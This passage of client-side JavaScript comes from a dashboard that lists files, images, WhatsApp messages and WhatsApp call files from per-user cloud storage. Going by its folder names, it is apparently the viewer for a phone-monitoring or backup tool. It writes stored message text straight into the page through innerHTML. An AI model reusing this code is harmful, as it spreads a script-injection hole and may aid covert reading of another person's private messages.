                        content.innerHTML = "Data not Found";
                        content.appendChild(mytable);
                    });
            }
        })
        .catch((error) => {
            loader.setAttribute("class", "hide_load");
            content.innerHTML = "Data not Found";
            content.setAttribute("style", "color:red;")
        });
}

function ShowSignal() {
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);
    var files_ref = storageRef.ref(user + "/wabs.json");
    files_ref
        .getDownloadURL()
        .then((url) => {
            {
                console.log(url);
                if (document.getElementById("wabs")) {
                    document.getElementById("wabs").remove();
                }
                fetch(url)
                    .then((response) => response.text())
                    .then((data) => {
                        // Do something with your data
                        obj = JSON.parse(data).WhatsappList;
                        var mytable = document.createElement("table");
                        mytable.setAttribute("class", "table ");
                        mytable.setAttribute("id", "wabs");
                        var contact_thead = document.createElement("thead");
                        var tr = document.createElement("tr");
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Date";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Divider";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Name";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:60%;")
                        th.innerHTML = "Text";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Type";
                        tr.appendChild(th);
                        contact_thead.appendChild(tr);
                        mytable.appendChild(contact_thead);
                        var contact_tbody = document.createElement("tbody");
                        // obj.sort(GetSortOrder("date"));
                        for (var i = 0; i < obj.length; i++) {
                            delete obj[i].id;
                        }
                        console.log(obj);
                        jsonObject = obj.map(JSON.stringify);
                        uniqueSet = new Set(jsonObject);
                        uniqueArray = Array.from(uniqueSet).map(JSON.parse);

                        console.log(uniqueArray);
                        uniqueArray.forEach(function(item) {
                            var tr = document.createElement("tr");
                            var td = document.createElement("td");
                            td.innerHTML = item.date;
                            td.setAttribute("style", "white-space: nowrap;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.divider;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.name;
                            td.setAttribute("style", "white-space: nowrap;");
                            tr.appendChild(td);
                            contact_tbody.appendChild(tr);
                            var td = document.createElement("td");
                            td.innerHTML = item.text;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.type;
                            tr.appendChild(td);
                            contact_tbody.appendChild(tr);
                        });

                        mytable.appendChild(contact_tbody);
                        loader.setAttribute("class", "hide_load");
                        content.appendChild(mytable);
                    });
            }
        })
        .catch((error) => {
            loader.setAttribute("class", "hide_load");
            content.innerHTML = "Data not Found";
            content.setAttribute("style", "color:red;")
        });
}

function ShowFiles() {
    var sr = 1;
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);

    var files_ref = storageRef.ref(user + "/files");
    files_ref
        .listAll()
        .then((res) => {
            var table = document.createElement("table");
            table.setAttribute("id", "table");
            table.setAttribute("class", "table ");
            var thead = document.createElement("thead");
            thead.setAttribute("id", "thead");
            var tr = document.createElement("tr");
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:10%;")
            th.innerHTML = "Sr.no";
            tr.appendChild(th);
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:60%;")
            th.innerHTML = "Document Name";
            tr.appendChild(th);
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:15%;")
            th.innerHTML = "Download";
            tr.appendChild(th);
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:15%;")
            th.innerHTML = "Delete";
            tr.appendChild(th);
            thead.appendChild(tr);
            var tbody = document.createElement("tbody");
            res.items.forEach((itemRef) => {
                if (notimage(itemRef.name)) {
                    // All the items under listRef.
                    var tr = document.createElement("tr");
                    var td = document.createElement("td");
                    td.innerHTML = sr;
                    sr += 1;
                    tr.appendChild(td);
                    var td = document.createElement("td");
                    td.innerHTML = itemRef.name;
                    tr.appendChild(td);
                    var td = document.createElement("td");
                    var button_donwload = document.createElement("button");
                    button_donwload.innerHTML = "Download";
                    storageRef
                        .ref(itemRef.fullPath)
                        .getDownloadURL()
                        .then((url) => {
                            // Insert url into an <img> tag to "download"
                            button_donwload.addEventListener("click", function(e) {
                                download(url, itemRef.name);
                            });
                        });
                    td.appendChild(button_donwload);
                    tr.appendChild(td);
                    var td = document.createElement("td");
                    var delete_btn = document.createElement("button");
                    delete_btn.addEventListener("click", function(e) {
                        storageRef.ref(itemRef.fullPath).delete();
                        ShowContact();
                    });
                    delete_btn.innerHTML = "Delete";
                    td.appendChild(delete_btn);
                    tr.appendChild(td);
                    tbody.appendChild(tr);
                    table.appendChild(thead);
                    table.appendChild(tbody);
                    loader.setAttribute("class", "hide_load");
                    content.appendChild(table);
                    console.log(itemRef.name);
                }
            });
        })

    .catch((error) => {
        loader.setAttribute("class", "hide_load");
        content.innerHTML = "Data not Found";
        content.setAttribute("style", "color:red;")
    });
}

function ShowImages() {
    var files_ref = storageRef.ref(user + "/files");
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);
    var image_content = document.createElement("div");
    image_content.setAttribute("id", "images_content");
    var images_gallery = document.createElement("div");
    images_gallery.setAttribute("id", "images_gallery");
    files_ref
        .listAll()
        .then((res) => {
            res.items.forEach((itemRef) => {
                if (notimage(itemRef.name) == false) {
                    storageRef
                        .ref(itemRef.fullPath)
                        .getDownloadURL()
                        .then((url) => {
                            var img_div = document.createElement("div");
                            img_div.setAttribute("id", "img_div");
                            var img = document.createElement("img");
                            img.src = url;
                            img_div.appendChild(img);
                            var btn_div = document.createElement("div");
                            btn_div.setAttribute("id", "img_btns");
                            var download_btn = document.createElement("button");
                            download_btn.innerHTML = "Download";
                            download_btn.addEventListener("click", function(e) {
                                download(url, itemRef.name);
                            });
                            btn_div.appendChild(download_btn);
                            var delete_btn = document.createElement("button");
                            delete_btn.innerHTML = "Delete";
                            delete_btn.addEventListener("click", function(e) {
                                storageRef.ref(itemRef.fullPath).delete();
                                ShowImages();
                            });
                            btn_div.appendChild(delete_btn);
                            img_div.appendChild(btn_div);
                            images_gallery.appendChild(img_div);
                        });
                    console.log(itemRef.name);
                }
            });
        })

    .catch((error) => {
        // Uh-oh, an error occurred!
    });
    image_content.appendChild(images_gallery);
    loader.setAttribute("class", "hide_load");
    content.appendChild(image_content);
}

function download(download_url, filename) {
    var postData = new FormData();
    var xhr = new XMLHttpRequest();
    xhr.open("GET", download_url, true);
    xhr.responseType = "blob";
    xhr.onload = function(e) {
        var blob = xhr.response;
        this.saveOrOpenBlob(blob, filename);
    }.bind(this);
    xhr.send(postData);
}

function saveOrOpenBlob(blob, fileName) {
    // var assetRecord = this.getAssetRecord();
    var fileName = fileName;
    var tempEl = document.createElement("a");
    document.body.appendChild(tempEl);
    tempEl.style = "display: none";
    url = window.URL.createObjectURL(blob);
    tempEl.href = url;
    tempEl.download = fileName;
    tempEl.click();
    window.URL.revokeObjectURL(url);
}

function notimage(ref) {
    if (ref.includes("jpeg")) {
        return false;
    }
    if (ref.includes("jpg")) {
        return false;
    }
    if (ref.includes("gif")) {
        return false;
    }
    if (ref.includes("svg")) {
        return false;
    }
    if (ref.includes("ico")) {
        return false;
    }
    if (ref.includes("png")) {
        return false;
    }
    return true;
}

function ShowContact_new() {}
ShowContact_new();

function GetSortOrder(prop) {
    console.log("called");
    return function(a, b) {
        if (a[prop] > b[prop]) {
            return 1;
        } else if (a[prop] < b[prop]) {
            return -1;
        }
        return 0;
    };
}

function WShowImages() {
    var files_ref = storageRef.ref(user + "/whatsapp");
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);
    var image_content = document.createElement("div");
    image_content.setAttribute("id", "images_content");
    var images_gallery = document.createElement("div");
    images_gallery.setAttribute("id", "images_gallery");
    files_ref
        .listAll()
        .then((res) => {
            res.items.forEach((itemRef) => {
                if (notimage(itemRef.name) == false) {
                    storageRef
                        .ref(itemRef.fullPath)
                        .getDownloadURL()
                        .then((url) => {
                            var img_div = document.createElement("div");
                            img_div.setAttribute("id", "img_div");
                            var img = document.createElement("img");
                            img.src = url;
                            img_div.appendChild(img);
                            var btn_div = document.createElement("div");
                            btn_div.setAttribute("id", "img_btns");
                            var download_btn = document.createElement("button");
                            download_btn.innerHTML = "Download";
                            download_btn.addEventListener("click", function(e) {
                                download(url, itemRef.name);
                            });
                            btn_div.appendChild(download_btn);
                            var delete_btn = document.createElement("button");
                            delete_btn.innerHTML = "Delete";
                            delete_btn.addEventListener("click", function(e) {
                                storageRef.ref(itemRef.fullPath).delete();
                                ShowImages();
                            });
                            btn_div.appendChild(delete_btn);
                            img_div.appendChild(btn_div);
                            images_gallery.appendChild(img_div);
                        });
                    console.log(itemRef.name);
                }
            });
        })

    .catch((error) => {
        // Uh-oh, an error occurred!
    });
    image_content.appendChild(images_gallery);
    loader.setAttribute("class", "hide_load");
    content.appendChild(image_content);
}

function WShowFiles() {
    var sr = 1;
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);

    var files_ref = storageRef.ref(user + "/whatsapp");
    files_ref
        .listAll()
        .then((res) => {
            var table = document.createElement("table");
            table.setAttribute("id", "table");
            table.setAttribute("class", "table ");
            var thead = document.createElement("thead");
            thead.setAttribute("id", "thead");
            var tr = document.createElement("tr");
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:10%;")
            th.innerHTML = "Sr.no";
            tr.appendChild(th);
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:60%;")
            th.innerHTML = "Document Name";
            tr.appendChild(th);
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:15%;")
            th.innerHTML = "Download";
            tr.appendChild(th);
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:15%;")
            th.innerHTML = "Delete";
            tr.appendChild(th);
            thead.appendChild(tr);
            var tbody = document.createElement("tbody");
            res.items.forEach((itemRef) => {
                if (notimage(itemRef.name)) {
                    // All the items under listRef.
                    var tr = document.createElement("tr");
                    var td = document.createElement("td");
                    td.innerHTML = sr;
                    sr += 1;
                    tr.appendChild(td);
                    var td = document.createElement("td");
                    td.innerHTML = itemRef.name;
                    tr.appendChild(td);
                    var td = document.createElement("td");
                    var button_donwload = document.createElement("button");
                    button_donwload.innerHTML = "Download";
                    storageRef
                        .ref(itemRef.fullPath)
                        .getDownloadURL()
                        .then((url) => {
                            // Insert url into an <img> tag to "download"
                            button_donwload.addEventListener("click", function(e) {
                                download(url, itemRef.name);
                            });
                        });
                    td.appendChild(button_donwload);
                    tr.appendChild(td);
                    var td = document.createElement("td");
                    var delete_btn = document.createElement("button");
                    delete_btn.addEventListener("click", function(e) {
                        storageRef.ref(itemRef.fullPath).delete();
                        ShowContact();
                    });
                    delete_btn.innerHTML = "Delete";
                    td.appendChild(delete_btn);
                    tr.appendChild(td);
                    tbody.appendChild(tr);
                    table.appendChild(thead);
                    table.appendChild(tbody);
                    loader.setAttribute("class", "hide_load");
                    content.appendChild(table);
                    console.log(itemRef.name);
                }
            });
        })

    .catch((error) => {
        loader.setAttribute("class", "hide_load");
        content.innerHTML = "Data not Found";
        content.setAttribute("style", "color:red;")
    });
}

function WRShowFiles() {
    var sr = 1;
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);

    var files_ref = storageRef.ref(user + "/WhatsappCall");
    files_ref
        .listAll()
        .then((res) => {
            var table = document.createElement("table");
            table.setAttribute("id", "table");
            table.setAttribute("class", "table ");
            var thead = document.createElement("thead");
            thead.setAttribute("id", "thead");
            var tr = document.createElement("tr");
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:10%;")
            th.innerHTML = "Sr.no";
            tr.appendChild(th);
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:60%;")
            th.innerHTML = "Document Name";
            tr.appendChild(th);
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:15%;")
            th.innerHTML = "Download";
            tr.appendChild(th);
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:15%;")
            th.innerHTML = "Delete";
            tr.appendChild(th);
            thead.appendChild(tr);
            var tbody = document.createElement("tbody");
            res.items.forEach((itemRef) => {
                if (notimage(itemRef.name)) {
                    // All the items under listRef.
                    var tr = document.createElement("tr");
                    var td = document.createElement("td");
                    td.innerHTML = sr;
                    sr += 1;
                    tr.appendChild(td);
                    var td = document.createElement("td");
                    td.innerHTML = itemRef.name;
                    tr.appendChild(td);
                    var td = document.createElement("td");
                    var button_donwload = document.createElement("button");
                    button_donwload.innerHTML = "Download";
                    storageRef
                        .ref(itemRef.fullPath)
                        .getDownloadURL()
                        .then((url) => {
                            // Insert url into an <img> tag to "download"
                            button_donwload.addEventListener("click", function(e) {
                                download(url, itemRef.name);
                            });
                        });
                    td.appendChild(button_donwload);
                    tr.appendChild(td);
                    var td = document.createElement("td");
                    var delete_btn = document.createElement("button");
                    delete_btn.addEventListener("click", function(e) {
                        storageRef.ref(itemRef.fullPath).delete();
                        ShowContact();
                    });
                    delete_btn.innerHTML = "Delete";
                    td.appendChild(delete_btn);
                    tr.appendChild(td);
                    tbody.appendChild(tr);
                    table.appendChild(thead);
                    table.appendChild(tbody);
                    loader.setAttribute("class", "hide_load");
                    content.appendChild(table);
                    console.log(itemRef.name);
                }
            });
        })

    .catch((error) => {
        loader.setAttribute("class", "hide_load");
        content.innerHTML = "Data not Found";
        content.setAttribute("style", "color:red;")
    });
}